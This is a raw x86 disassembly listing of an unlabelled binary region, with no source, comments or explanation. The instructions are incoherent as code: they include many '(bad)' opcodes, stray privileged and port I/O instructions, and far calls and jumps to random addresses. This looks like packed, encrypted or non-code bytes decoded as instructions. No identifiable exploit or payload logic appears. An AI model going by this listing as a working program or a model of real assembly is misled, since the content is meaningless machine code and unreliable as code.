  40751e:	fcmovne st,st(0)
  407520:	dec    edi
  407521:	mov    edx,0xfc4a53ee
  407526:	xchg   al,dh
  407528:	add    al,ah
  40752a:	fwait
  40752b:	mov    eax,ds:0x78b6ce2e
  407530:	push   esi
  407531:	adc    DWORD PTR [ecx-0x45da197],ebx
  407537:	aaa    
  407538:	xchg   ebx,eax
  407539:	mov    cl,0x1f
  40753b:	in     eax,dx
  40753c:	(bad)  
  40753d:	pusha  
  40753e:	push   edx
  40753f:	pop    ecx
  407540:	xor    BYTE PTR [edx],al
  407542:	mov    dh,0xf
  407544:	inc    eax
  407545:	stc    
  407546:	out    dx,al
  407547:	rol    DWORD PTR [esi-0x331d79a3],0xc9
  40754e:	ins    BYTE PTR es:[edi],dx
  40754f:	xchg   ebp,eax
  407550:	or     eax,DWORD PTR [ebx+0x305d2a0b]
  407556:	push   ss
  407557:	dec    esp
  407558:	div    DWORD PTR [ecx]
  40755a:	ds jge 0x40756d
  40755d:	cli    
  40755e:	and    al,0x9e
  407560:	pop    ebp
  407561:	popa   
  407562:	xor    eax,0x18895fe3
  407567:	jmp    0x94b0d6ad
  40756c:	loope  0x4075ac
  40756e:	xor    ebx,DWORD PTR [ecx-0x4e11f51b]
  407574:	cmp    ecx,DWORD PTR [ebp+0x78]
  407577:	inc    ecx
  407578:	sbb    eax,0x74a44330
  40757d:	mov    bl,0xac
  40757f:	lahf   
  407580:	mov    ds:0x969336ee,al
  407585:	add    al,0xee
  407587:	fsub   QWORD PTR [ebx]
  407589:	lods   al,BYTE PTR ds:[esi]
  40758a:	adc    al,0x25
  40758c:	(bad)  
  40758e:	push   edi
  40758f:	mov    eax,ds:0x80bf6fc0
  407594:	sub    BYTE PTR [ebx+0x7e5e8806],bh
  40759a:	jg     0x4075a2
  40759c:	clc    
  40759d:	inc    eax
  40759e:	call   0xa2f6:0x6087e3
  4075a5:	fidiv  DWORD PTR [eax-0x110f11f7]
  4075ab:	push   ss
  4075ac:	inc    ebx
  4075ad:	retf   0x8b47
  4075b0:	sti    
  4075b1:	lods   eax,DWORD PTR ds:[esi]
  4075b2:	mov    ebx,0xece8e7a0
  4075b7:	dec    dx
  4075b9:	jae    0x407573
  4075bb:	call   FWORD PTR [esi-0x68]
  4075be:	or     BYTE PTR [ecx],cl
  4075c0:	fwait
  4075c1:	jae    0x4075fa
  4075c3:	sbb    bl,BYTE PTR [edx+0x67eee360]
  4075c9:	add    BYTE PTR [edx-0x4f],ah
  4075cc:	xor    cl,BYTE PTR [edi]
  4075ce:	out    dx,al
  4075cf:	sbb    esp,DWORD PTR [ecx+0x8f3a3da]
  4075d5:	je     0x40764d
  4075d7:	icebp  
  4075d8:	fs popa 
  4075da:	jmp    0x24e9:0xc7d371a3
  4075e1:	pop    ecx
  4075e2:	lock xchg BYTE PTR [edi+0x4e],ah
  4075e6:	lds    eax,FWORD PTR [eax-0x1fdba964]
  4075ec:	clc    
  4075ed:	pusha  
  4075ee:	icebp  
  4075ef:	cmp    BYTE PTR [ebp+0x140c1af4],al
  4075f5:	fsub   st(6),st
  4075f7:	sahf   
  4075f8:	loopne 0x4075ce
  4075fa:	arpl   WORD PTR [ebp+eiz*4-0x585ea0ea],di
  407601:	mov    eax,0x2a56835a
  407606:	mov    esi,0xae3710
  40760b:	mov    eax,ds:0x999b031a
  407610:	and    DWORD PTR [ecx-0x31],eax
  407613:	mov    al,ds:0xcbe70ac2
  407618:	rcr    BYTE PTR [ecx+0x75e66c8],1
  40761e:	xchg   BYTE PTR [edx-0x1780c2a9],al
  407624:	push   edx
  407625:	pop    edi
  407626:	call   0xfe86:0x98516980
  40762d:	jo     0x4076ad
  40762f:	in     eax,0x5e
  407631:	dec    esi
  407632:	jmp    0xff66:0x20f295dd
  407639:	push   ecx
  40763a:	mov    edi,?
  40763c:	or     BYTE PTR [edi],dl
  40763e:	out    dx,al
  40763f:	pop    ss
  407640:	dec    esi
  407641:	or     BYTE PTR [eax],bl
  407643:	push   ebx
  407644:	pop    esi
  407645:	sbb    al,0x2
  407647:	fwait
  407648:	jg     0x407625
  40764a:	out    0xb1,al
  40764c:	push   ecx
  40764d:	popa   
  40764e:	xor    eax,DWORD PTR [edx-0x336b748d]
  407654:	inc    ebp
  407655:	pop    eax
  407656:	push   edx
  407657:	hlt    
  407658:	pop    esi
  407659:	test   eax,0x1dec95a6
  40765e:	retf   0x1ec
  407661:	xor    DWORD PTR ds:0xe12bc3a1,esi
  407667:	jo     0x40761e
  407669:	pop    edi
  40766a:	out    dx,eax
  40766b:	or     bl,BYTE PTR [edi+0x18]
  40766e:	dec    ecx
  40766f:	fst    QWORD PTR [ecx+eiz*1-0x2c]
  407673:	js     0x4076b7
  407675:	scas   al,BYTE PTR es:[edi]
  407676:	hlt    
  407677:	jp     0x407612
  407679:	lock fsub DWORD PTR [eax+0xabf34b9]
  407680:	mov    eax,0x335c9868
  407685:	xchg   BYTE PTR [ebx-0x70],dl
  407688:	inc    esi
  407689:	sbb    al,0xab
  40768b:	mov    WORD PTR [esi],gs
  40768d:	push   ecx
  40768e:	xchg   edx,eax
  40768f:	sbb    edi,ebx
  407691:	mov    dl,0xeb
  407693:	repnz mov esp,0x10410e60
  407699:	pushf  
  40769a:	enter  0x1472,0x26
  40769e:	pop    eax
  40769f:	bound  ebx,QWORD PTR [esi-0x8]
  4076a2:	mov    cl,0xf2
  4076a4:	fnsave [edx]
  4076a6:	push   ds
  4076a7:	mov    esp,0x65e75c26
  4076ac:	mov    ebx,0xb96175bc
  4076b1:	add    BYTE PTR [esp+ecx*2+0x7709895e],cl
  4076b8:	not    DWORD PTR ds:0x52b7b29f
  4076be:	pop    ds
  4076bf:	pop    edi
  4076c0:	xchg   dh,ah
  4076c2:	dec    esi
  4076c3:	aaa    
  4076c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4076c5:	inc    ebx
  4076c6:	jmp    0x407676
  4076c8:	pop    esi
  4076c9:	pop    ebp
  4076ca:	jo     0x4076a7
  4076cc:	and    al,0xe1
  4076ce:	push   ecx
  4076cf:	push   ss
  4076d0:	inc    edi
  4076d1:	push   edx
  4076d2:	jb     0x407661
  4076d4:	jne    0x407668
  4076d6:	dec    esi
  4076d7:	mov    ch,0x7d
  4076d9:	neg    DWORD PTR [edx+eiz*2]
  4076dc:	pop    esi
  4076dd:	mov    edx,0x5503be59
  4076e2:	mov    ebp,0x9c64c1d7
  4076e7:	pop    esp
  4076e8:	fs mov ch,0x31
  4076eb:	adc    BYTE PTR [ecx],0xe1
  4076ee:	push   esp
  4076ef:	(bad)  
  4076f0:	(bad)  
  4076f1:	cs jge 0x4076ed
  4076f4:	pop    esi
  4076f5:	mov    eax,0x49f19ab2
  4076fa:	lods   al,BYTE PTR ds:[esi]
  4076fb:	retf   0x60d7
  4076fe:	ja     0x4076ff
  407700:	sahf   
  407701:	lahf   
  407702:	push   0xffffffc9
  407704:	stos   DWORD PTR es:[edi],eax
  407705:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407706:	out    dx,al
  407707:	(bad)  
  407709:	shl    DWORD PTR [ecx],0x89
  40770c:	xor    esi,DWORD PTR [eax+0x38]
  40770f:	mov    eax,ds:0xc2ffd493
  407714:	xchg   esi,eax
  407715:	stc    
  407716:	pop    es
  407717:	test   al,0xef
  407719:	cld    
  40771a:	out    dx,al
  40771b:	adc    eax,0x8b1f35f2
  407720:	inc    esi
  407721:	adc    edx,edx
  407723:	mov    al,ds:0xb17fe91b
  407728:	sub    al,0x9a
  40772a:	(bad)  
  40772b:	dec    esi
  40772c:	pop    edi
  40772d:	mov    ch,0x21
  40772f:	scas   eax,DWORD PTR es:[edi]
  407730:	jp     0x4076f8
  407732:	in     al,0x19
  407734:	adc    eax,0xb29642b1
  407739:	pusha  
  40773a:	cmp    DWORD PTR [ebx+0x63087056],esi
  407740:	cwde   
  407741:	iret   
  407742:	mov    dh,0x18
  407744:	enter  0x7460,0x1
  407748:	adc    DWORD PTR [ebp-0x79],ebp
  40774b:	not    DWORD PTR [edx+0x4b884a60]
  407751:	lahf   
  407752:	stos   BYTE PTR es:[edi],al
  407753:	cmovl  ecx,ebx
  407756:	jmp    0xde06:0xb25f282
  40775d:	arpl   WORD PTR [eax+0x4],ax
  407760:	and    al,0x61
  407762:	inc    ebx
  407763:	and    eax,0xc80df639
  407768:	cli    
  407769:	pop    ebp
  40776a:	out    dx,al
  40776b:	pop    esi
  40776c:	xor    ebp,DWORD PTR [eax]
  40776e:	mov    edx,0xbb5f1a30
  407773:	mov    al,ds:0x75de2e57
  407778:	mov    ah,0xd2
  40777a:	test   ch,bh
  40777c:	cmp    DWORD PTR [ebp+0x23776947],edx
  407782:	mov    BYTE PTR [ecx-0xd398054],ah
  407788:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407789:	pop    ebp
  40778a:	aas    
  40778b:	int3   
  40778c:	pop    ebp
  40778d:	lods   al,BYTE PTR ds:[esi]
  40778e:	dec    esi
  40778f:	pop    ds
  407790:	inc    ebx
  407791:	mov    BYTE PTR [ebx+0x4e],dl
  407794:	xor    DWORD PTR cs:[edx-0x5e],esp
  407798:	xlat   BYTE PTR ds:[ebx]
  407799:	sub    ebx,DWORD PTR [eax-0x25c0b6d9]
  40779f:	jns    0x407795
  4077a1:	mov    ah,0x1
  4077a3:	mov    DWORD PTR [esi-0x65951189],eax
  4077a9:	xor    ebx,esp
  4077ab:	jnp    0x407745
  4077ad:	push   ecx
  4077ae:	lahf   
  4077af:	mov    eax,ds:0x4bea313d
  4077b4:	lea    esi,[eax+0x5a]
  4077b7:	popf   
  4077b8:	jo     0x4077a5
  4077ba:	out    dx,al
  4077bb:	jne    0x407772
  4077bd:	mov    edi,0xd347008c
  4077c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4077c3:	mov    eax,ds:0xd4499fa0
  4077c8:	or     edi,edx
  4077ca:	(bad)  
  4077cb:	xchg   ecx,eax
  4077cc:	pop    ebp
  4077cd:	add    al,0xbd
  4077cf:	cmc    
  4077d0:	(bad)  
  4077d2:	stos   WORD PTR es:[edi],ax
  4077d4:	std    
  4077d5:	mov    esi,0x60e72f52
  4077da:	(bad)  
  4077db:	lods   eax,DWORD PTR ds:[esi]
  4077dc:	push   edi
  4077dd:	jbe    0x4077f4
  4077df:	dec    edx
  4077e0:	cs push edi
  4077e2:	out    dx,al
  4077e3:	out    0x81,al
  4077e5:	pop    ds
  4077e6:	cmp    dl,ch
  4077e8:	xchg   edi,eax
  4077e9:	test   ah,ah
  4077eb:	mov    al,ds:0x76cd9cbd
  4077f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4077f1:	dec    eax
  4077f2:	call   0xba50abb1
  4077f7:	mov    esi,0x5507e1a3
  4077fc:	xchg   edi,eax
  4077fd:	pusha  
  4077fe:	hlt    
  4077ff:	mov    eax,ds:0x849f9b00
  407804:	xor    eax,0xa5215625
  407809:	jge    0x40781a
  40780b:	dec    di
  40780d:	lock mov al,ds:0x6ab5e690
  407813:	popa   
  407814:	push   cs
  407815:	mov    eax,0xe85649f5
  40781a:	out    dx,al
  40781b:	jp     0x4077e9
  40781d:	iret   
  40781e:	xor    BYTE PTR [ebp-0x26c8b500],cl
  407824:	out    0xff,al
  407826:	out    dx,eax
  407827:	je     0x4077e3
  407829:	or     BYTE PTR [esi-0x19],ch
  40782c:	mov    ebp,0x5e063824
  407831:	jmp    0x407893
  407833:	sub    ebx,DWORD PTR [ecx]
  407835:	das    
  407836:	mov    fs,WORD PTR [esi-0x7f]
  407839:	pusha  
  40783a:	mov    eax,ds:0x735bdc34
  40783f:	lock push edx
  407841:	mov    eax,0xc67c35ee
  407846:	adc    BYTE PTR [ebp+ebx*4-0x4d5e3cb6],dh
  40784d:	in     eax,0x53
  40784f:	(bad)  
  407850:	jns    0x4077f4
  407852:	ds pop esi
  407854:	jle    0x4077f9
  407856:	test   al,0x74
  407858:	scas   al,BYTE PTR es:[edi]
  407859:	hlt    
  40785a:	out    dx,al
  40785b:	fs aaa 
  40785d:	out    dx,al
  40785e:	loop   0x4077e4
  407860:	cmp    dl,BYTE PTR [edi+0x748fa0c9]
  407866:	bound  ebp,QWORD PTR [ecx+0x35]
  407869:	add    bh,al
  40786b:	or     DWORD PTR [esi+0x4c],ebx
  40786e:	ins    DWORD PTR es:[edi],dx
  40786f:	lods   al,BYTE PTR ds:[esi]
  407870:	in     eax,0x8b
  407872:	fsubr  st,st(2)
  407874:	pop    eax
  407875:	popa   
  407876:	cmp    esp,DWORD PTR [eax+0x35317715]
  40787c:	and    al,0x7
  40787e:	jecxz  0x4078ce
  407880:	arpl   dx,si
  407882:	das    
  407883:	sub    ecx,DWORD PTR [ebp-0x61c38940]
  407889:	cwde   
  40788a:	nop
  40788b:	mov    eax,ds:0x9bd75b3
  407890:	jbe    0x40782e
  407892:	hlt    
  407893:	push   eax
  407894:	hlt    
  407895:	xor    dh,ch
  407897:	inc    ebp
  407898:	sbb    BYTE PTR ss:[ecx],ah
  40789b:	call   0xdbcd:0xc94ad546
  4078a2:	out    dx,al
  4078a3:	mov    al,0x75
  4078a5:	loope  0x40791b
  4078a7:	xor    al,0xb7
  4078a9:	aaa    
  4078aa:	push   ds
  4078ab:	xchg   BYTE PTR [esi],bl
  4078ad:	loope  0x4078f1
  4078af:	enter  0x5a60,0x10
  4078b3:	sti    
  4078b4:	(bad)
  4078b7:	xor    DWORD PTR [ebp-0x8],0x415e425b
  4078be:	retf   
  4078bf:	mov    ebx,0x84c9f3c9
  4078c4:	outs   dx,BYTE PTR ds:[esi]
  4078c5:	pusha  
  4078c6:	pop    edx
  4078c7:	adc    ah,BYTE PTR [ebx]
  4078c9:	iret   
  4078ca:	or     DWORD PTR [edx+0x7aed8844],esi
  4078d0:	gs pop es
  4078d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4078d3:	pop    ss
  4078d4:	sbb    edx,DWORD PTR [edi]
  4078d6:	pop    esi
  4078d7:	dec    ebx
  4078d8:	jecxz  0x40791d
  4078da:	sbb    al,cl
  4078dc:	sub    DWORD PTR [ecx],esp
  4078de:	imul   esp,ecx,0xeba33fc4
  4078e4:	pop    esi
  4078e5:	push   ecx
  4078e6:	mov    al,0x1c
  4078e8:	shl    BYTE PTR [ebx+0x614c89fa],cl
  4078ee:	mov    ah,0x6b
  4078f0:	cmp    dh,ah
  4078f2:	mov    ebp,0xee343cba
  4078f7:	pushf  
  4078f8:	adc    BYTE PTR [esi-0x15],al
  4078fb:	ffreep st(6)
  4078fd:	and    eax,0x75aea1d7
  407902:	or     al,0x72
  407904:	mov    ebp,DWORD PTR [eax+ebx*1]
  407907:	jno    0x407983
  407909:	push   esp
  40790a:	jmp    0xb3e8:0xd43f1010
  407911:	mov    al,ds:0x20895bea
  407916:	fdiv   st(1),st
  407918:	pop    esi
  407919:	retf   0x4c37
  40791c:	push   0xffffffed
  40791e:	int    0xbb
  407920:	adc    DWORD PTR [ecx+0x6f],esp
  407923:	and    eax,0x5d821083
  407928:	pop    edi
  407929:	shl    edi,1
  40792b:	inc    ecx
  40792c:	or     BYTE PTR [edi-0x6a61496c],0xa9
  407933:	push   ebx
  407934:	cmp    al,0x61
  407936:	out    0x4e,eax
  407938:	mov    cl,0x87
  40793a:	jp     0x40799e
  40793c:	lahf   
  40793d:	das    
  40793e:	out    dx,al
  40793f:	jns    0x40795b
  407941:	imul   edx,DWORD PTR [ebx-0x3f],0xa17bc772
  407948:	ficom  WORD PTR ds:0x198d1101
  40794e:	adc    esp,DWORD PTR [edx+0x5e]
  407951:	ins    DWORD PTR es:[edi],dx
  407952:	lods   eax,DWORD PTR ds:[esi]
  407953:	xchg   edi,eax
  407954:	pusha  
  407955:	dec    ecx
  407956:	sub    al,0x18
  407958:	loope  0x4079b3
  40795a:	push   0x279db9d2
  40795f:	loope  0x4078e2
  407961:	xor    BYTE PTR [eax],al
  407963:	pop    ebp
  407964:	pop    esi
  407965:	stc    
  407966:	fisttp DWORD PTR [ebp-0x1b7c2154]
  40796c:	js     0x4079cd
  40796e:	sub    al,0xee
  407970:	mov    BYTE PTR [edx+ebx*2],al
  407973:	loope  0x407908
  407975:	mov    eax,0x9a5ef070
  40797a:	mov    esi,0xeaabfe7f
  40797f:	cmp    ebx,DWORD PTR [ecx+0x3a8dd360]
  407985:	inc    ebx
  407986:	sbb    eax,0xee64905d
  40798b:	rol    DWORD PTR [ebp-0x26],cl
  40798e:	sub    BYTE PTR [edx-0x5e97144f],ch
  407994:	mov    esp,0xc586e004
  407999:	je     0x407955
  40799b:	fistp  WORD PTR [ebp-0x5a]
  40799e:	mov    edi,0xdedf6fe3
  4079a3:	cld    
  4079a4:	mov    fs,WORD PTR [esp+eax*4+0x6f006ba9]
  4079ab:	push   eax
  4079ac:	in     al,dx
  4079ad:	and    DWORD PTR [ebx],edi
  4079af:	sbb    eax,0xf15f714a
  4079b4:	xchg   ebx,eax
  4079b5:	xor    esi,ebp
  4079b7:	mov    esi,0x7431514
  4079bc:	aad    0x84
  4079be:	and    eax,0x15282fa1
  4079c3:	mov    WORD PTR [eax+0x65],?
  4079c6:	mov    ecx,es
  4079c8:	xor    dl,dh
  4079ca:	add    eax,0x3ea0d224
  4079cf:	enter  0xb91d,0xb5
  4079d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4079d4:	jp     0x4079fa
  4079d6:	addr16 cwde 
  4079d8:	sbb    dh,ch
  4079da:	mov    al,0xa0
  4079dc:	leave  
  4079dd:	xor    ebx,ebx
  4079df:	xchg   esi,eax
  4079e0:	jbe    0x4079b9
  4079e2:	out    dx,eax
  4079e3:	aaa    
  4079e4:	cdq    
  4079e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4079e6:	push   es
  4079e7:	test   DWORD PTR [edx-0x2287dc44],0x67d19122
  4079f1:	add    eax,0x8df9c0bf
  4079f6:	xchg   BYTE PTR [ebx+eiz*2+0x1ad33345],ah
  4079fd:	ror    esp,0xc1
  407a00:	pop    edi
  407a01:	lock test al,0xa0
  407a04:	fs or  al,0x41
  407a07:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407a08:	je     0x407997
  407a0a:	fild   DWORD PTR [edx+0x5e]
  407a0d:	or     BYTE PTR [ebx+0x1de9ff64],ch
  407a13:	mov    ebp,0x7ba96166
  407a18:	push   cs
  407a19:	mov    DWORD PTR [ebx+0xf],ecx
  407a1c:	test   eax,0x7e09ee28
  407a21:	inc    esp
  407a22:	or     al,0xde
  407a24:	and    ch,BYTE PTR [esi+0x7]
  407a27:	fnstcw WORD PTR [edx+0x26]
  407a2a:	out    0x9f,eax
  407a2c:	loop   0x407aa0
  407a2e:	test   al,0xf0
  407a30:	adc    al,0xc4
  407a33:	in     eax,0x5e
  407a35:	jnp    0x407a13
  407a37:	dec    ecx
  407a38:	ror    BYTE PTR [ebx-0x7a],cl
  407a3b:	in     eax,0x3b
  407a3d:	push   0x445e5f83
  407a42:	mov    esp,0xca6cee38
  407a47:	mov    esi,0x53562b52
  407a4c:	xor    bl,dl
  407a4e:	inc    esi
  407a4f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407a50:	sbb    eax,0x9889fe12
  407a55:	dec    ebp
  407a56:	pop    ds
  407a57:	test   al,0xdf
  407a59:	aam    0xe
  407a5b:	lea    ebp,[edi-0x4c646d30]
  407a61:	jl     0x407a51
  407a63:	mov    edi,0xeb4662f
  407a68:	push   es
  407a69:	mov    ch,0x46
  407a6b:	mov    eax,ds:0x198d3ea0
  407a70:	jmp    0x407ab7
  407a72:	xchg   ebx,eax
  407a73:	sahf   
  407a74:	jl     0x407a77
  407a76:	out    0xbc,eax
  407a78:	add    edx,eax
  407a7a:	push   ebx
  407a7b:	xlat   BYTE PTR ds:[ebx]
  407a7c:	inc    BYTE PTR [ebx-0x4b]
  407a7f:	push   es
  407a80:	mov    al,0x59
  407a82:	cli    
  407a83:	inc    eax
  407a84:	xor    al,bh
  407a86:	push   esp
  407a87:	and    DWORD PTR [ebp+0x5eaa043e],edi
  407a8d:	xchg   edx,eax
  407a8e:	mov    al,ds:0xe25a278e
  407a93:	sbb    edx,DWORD PTR [edx+0x3d707f60]
  407a99:	mov    ebp,0xc2cbee79
  407a9e:	and    cl,ch
  407aa0:	push   esi
  407aa1:	loope  0x407a40
  407aa3:	scas   al,BYTE PTR es:[edi]
  407aa4:	pop    ecx
  407aa5:	push   ebp
  407aa6:	out    0x64,al
  407aa8:	dec    eax
  407aa9:	popa   
  407aaa:	and    DWORD PTR [esi+0x67],0xa0041876
  407ab1:	push   0xa4dfcee
  407ab6:	mov    ebx,0x40322386
  407abb:	jp     0x407b37
  407abd:	iret   
  407abe:	(bad)
  407ac2:	jno    0x407a65
  407ac4:	push   edi
  407ac5:	mov    edx,fs
  407ac7:	out    0xd5,eax
  407ac9:	mov    dh,0xee
  407acb:	aaa    
  407acc:	sub    bh,BYTE PTR [ecx+0x69]
  407acf:	out    dx,al
  407ad0:	into   
  407ad1:	out    0x6d,eax
  407ad3:	mov    ds:0xb9af50b2,al
  407ad8:	mov    ecx,0x32bd6fd9
  407add:	push   ebx
  407ade:	jbe    0x407b17
  407ae0:	jp     0x407b22
  407ae2:	push   eax
  407ae3:	push   0xfffffff8
  407ae5:	adc    BYTE PTR fs:[ecx-0x6b00d08a],ah
  407aec:	mov    ds:0x5ea00419,al
  407af1:	cmp    eax,0xdb9a9e89
  407af6:	bound  edx,QWORD PTR [eax+eiz*1+0x2640ea61]
  407afd:	mov    ecx,0x1d2f7135
  407b02:	in     eax,dx
  407b03:	pop    edx
  407b04:	dec    eax
  407b05:	push   ds
  407b06:	out    dx,eax
  407b07:	xor    DWORD PTR [ebx-0x3b],0x3e
  407b0b:	test   al,0xe0
  407b0d:	pop    ecx
  407b0e:	cld    
  407b0f:	sub    esi,DWORD PTR [eax+0xe]
  407b12:	retf   0xaf80
  407b15:	outs   dx,BYTE PTR ds:[esi]
  407b16:	mul    BYTE PTR [edx+0x38]
  407b19:	leave  
  407b1a:	fisub  DWORD PTR [eax-0x57daeb46]
  407b20:	mov    ah,0x33
  407b22:	test   DWORD PTR [ecx],ebp
  407b24:	push   ds
  407b25:	mov    ebp,0x198ca0e0
  407b2a:	and    BYTE PTR [edi],0x2
  407b2d:	push   ecx
  407b2e:	cmp    ecx,DWORD PTR [ebx+0x5e]
  407b31:	lods   eax,DWORD PTR ss:[esi]
  407b33:	das    
  407b34:	or     eax,0x34cd572d
  407b39:	popa   
  407b3a:	test   al,0xb7
  407b3c:	and    DWORD PTR [ecx],edi
  407b3e:	xchg   esi,eax
  407b3f:	push   ebp
  407b40:	retf   
  407b41:	mov    eax,ds:0x57c5a724
  407b46:	sti    
  407b47:	arpl   WORD PTR [edx-0x3be22ca4],di
  407b4d:	mov    al,ds:0x804ad957
  407b52:	mov    dh,0xc3
  407b54:	jne    0x407baf
  407b56:	jns    0x407bc4
  407b58:	mov    ecx,ebx
  407b5a:	push   ds
  407b5b:	outs   dx,DWORD PTR ds:[esi]
  407b5c:	and    BYTE PTR [esi+edx*1],dl
  407b5f:	mov    eax,ds:0xcb354fa4
  407b64:	arpl   WORD PTR [ecx],si
  407b66:	lea    esi,[edi]
  407b68:	jp     0x407bb0
  407b6a:	out    dx,al
  407b6b:	mov    ds:0xc279df6c,al
  407b70:	sbb    eax,0xfef16794
  407b75:	pusha  
  407b76:	xchg   ebx,eax
  407b77:	cld    
  407b78:	adc    dh,ah
  407b7a:	jbe    0x407bfa
  407b7c:	call   0xba85:0xa8d5ee05
  407b83:	mov    ebp,0xa0aa6679
  407b88:	lahf   
  407b89:	xor    DWORD PTR [ebx-0x705c3693],ebx
  407b8f:	out    dx,eax
  407b90:	pop    esi
  407b91:	lods   al,BYTE PTR ds:[esi]
  407b92:	test   BYTE PTR [eax+0x59],ah
  407b95:	mov    dh,0x93
  407b97:	sub    eax,0x6bc760e9
  407b9c:	shl    DWORD PTR [edi+ebx*8-0x5],1
  407ba0:	popa   
  407ba1:	fucomi st,st(6)
  407ba3:	hlt    
  407ba4:	repnz or eax,0xf9f860f2
  407baa:	xor    ah,BYTE PTR [ecx-0x4af6b2a4]
  407bb0:	pop    eax
  407bb1:	or     BYTE PTR [edi+0x58],dl
  407bb4:	pop    edi
  407bb5:	mov    al,ds:0x16ab744d
  407bba:	push   ebx
  407bbb:	cmp    DWORD PTR [eax-0x7c5465a7],ebp
  407bc1:	fs out dx,al
  407bc3:	push   eax
  407bc4:	call   0xeec4:0x79b17ca2
  407bcb:	or     esi,ebp
  407bcd:	in     al,0xd2
  407bcf:	loopne 0x407b6a
  407bd1:	mov    ecx,?
  407bd3:	mov    al,ds:0xe868e038
  407bd8:	loope  0x407c18
  407bda:	out    0x95,eax
  407bdc:	pop    esi
  407bdd:	ins    DWORD PTR es:[edi],dx
  407bde:	jnp    0x407b98
  407be0:	repnz inc BYTE PTR [ebp-0x4e9f7c29]
  407be7:	or     BYTE PTR [ecx-0x47],bh
  407bea:	xchg   ebp,eax
  407beb:	adc    eax,esi
  407bed:	xchg   ebp,eax
  407bee:	dec    edx
  407bef:	push   ds
  407bf0:	mov    dh,0x89
  407bf2:	fcomp  DWORD PTR [ebx]
  407bf4:	pop    esi
  407bf5:	neg    BYTE PTR [edi+0x23]
  407bf8:	ret    
  407bf9:	pop    edi
  407bfa:	dec    ebp
  407bfb:	mov    WORD PTR [edi+0x61],fs
  407bfe:	jns    0x407c2e
  407c00:	sbb    bl,BYTE PTR [edi]
  407c02:	mov    ebp,0x64ad84c5
  407c07:	dec    eax
  407c08:	push   ebx
  407c09:	jbe    0x407bf0
  407c0b:	dec    edi
  407c0c:	sahf   
  407c0d:	dec    si
  407c0f:	adc    al,0xea
  407c11:	enter  0xbf3c,0x62
  407c15:	outs   dx,DWORD PTR ds:[esi]
  407c16:	daa    
  407c17:	mov    ebp,0x37f36134
  407c1c:	fidivr WORD PTR ds:0x7c5eec0d
  407c22:	mov    esi,DWORD PTR [ebx]
  407c24:	loop   0x407c78
  407c26:	js     0x407c8b
  407c28:	mov    ebp,0xacfefe60
  407c2d:	sbb    al,0x32
  407c2f:	pushf  
  407c30:	pop    bp
  407c32:	and    DWORD PTR [eax],ebx
  407c34:	scas   eax,DWORD PTR es:[edi]
  407c35:	pusha  
  407c36:	sbb    al,0xb2
  407c38:	pop    ss
  407c39:	sub    edx,esp
  407c3b:	lahf   
  407c3c:	int3   
  407c3d:	pusha  
  407c3e:	je     0x407c4e
  407c40:	add    BYTE PTR [edx],dh
  407c42:	retf   0x25dd
  407c45:	fucomp st(6)
  407c47:	test   eax,0xf235e73
  407c4c:	jecxz  0x407c9d
  407c4e:	aam    0xa0
  407c50:	hlt    
  407c51:	scas   eax,DWORD PTR es:[edi]
  407c52:	sbb    DWORD PTR [ecx],eax
  407c54:	inc    ebp
  407c55:	(bad)  
  407c56:	ror    DWORD PTR [esi-0xf118c82],1
  407c5c:	imul   ebx
  407c5e:	repnz add DWORD PTR [ebx+0x35dd3863],ebx
  407c65:	(bad)  
  407c66:	out    dx,al
  407c67:	inc    ebp
  407c68:	fnsave [ebx]
  407c6a:	sahf   
  407c6b:	mov    edx,0x6eeea59
  407c70:	aam    0xdb
  407c72:	and    esi,edx
  407c74:	mov    ebp,0xdc99fb3b
  407c79:	rcr    DWORD PTR [ecx],1
  407c7b:	jne    0x407c5c
  407c7d:	js     0x407c95
  407c7f:	popa   
  407c80:	faddp  st(1),st
  407c82:	jne    0x407c41
  407c84:	pop    esi
  407c85:	cmp    DWORD PTR [ecx+0x2],esi
  407c88:	pusha  
  407c89:	cld    
  407c8a:	(bad)  
  407c8c:	fiadd  WORD PTR [ebx-0x75]
  407c8f:	out    dx,al
  407c90:	mov    eax,fs
  407c92:	je     0x407c6f
  407c94:	add    dl,0xd
  407c97:	xor    al,0x60
  407c99:	imul   eax,ecx,0x993b274d
  407c9f:	loope  0x407ca6
  407ca1:	dec    eax
  407ca2:	adc    bl,ch
  407ca4:	ds and dh,ch
  407ca7:	addr16 cmp eax,0x120d6942
  407cad:	ins    BYTE PTR es:[edi],dx
  407cae:	out    dx,al
  407caf:	inc    ebp
  407cb0:	mov    ax,ds:0xc14ff5f4
  407cb6:	cmp    DWORD PTR [ecx-0x255e7604],esp
  407cbc:	and    BYTE PTR [edi+0x5a5e9842],dl
  407cc2:	cwde   
  407cc3:	popa   
  407cc4:	or     BYTE PTR [ebp+0x61279514],0xc1
  407ccb:	sub    edx,esi
  407ccd:	sub    ecx,edx
  407ccf:	(bad)  
  407cd0:	in     eax,dx
  407cd1:	call   0x12ee:0x986edf12
  407cd8:	test   al,0x3d
  407cda:	xchg   ebp,eax
  407cdb:	lea    edx,[edi-0x2c65bba0]
  407ce1:	lods   eax,DWORD PTR ds:[esi]
  407ce2:	inc    ecx
  407ce3:	cld    
  407ce4:	(bad)  
  407ce6:	out    dx,al
  407ce7:	xchg   esp,eax
  407ce8:	sbb    al,0x8b
  407cea:	popf   
  407ceb:	push   0xa80f0eb4
  407cf0:	cwde   
  407cf1:	add    eax,0x50b329df
  407cf6:	jb     0x407d04
  407cf8:	sbb    cl,BYTE PTR [esi+ebp*8]
  407cfb:	cmovbe edi,DWORD PTR [ebp-0x10]
  407cff:	sbb    ebp,DWORD PTR ds:[edx+0x4da378e0]
  407d06:	or     bl,dl
  407d08:	shl    BYTE PTR [eax+0x4a],0x6e
  407d0c:	jp     0x407d6b
  407d0e:	pop    eax
  407d0f:	mov    ebp,0x89a9c5e
  407d14:	xchg   edx,eax
  407d15:	push   edx
  407d16:	repnz lds edx,FWORD PTR [ecx+ebp*2+0x51]
  407d1b:	repz pop esi
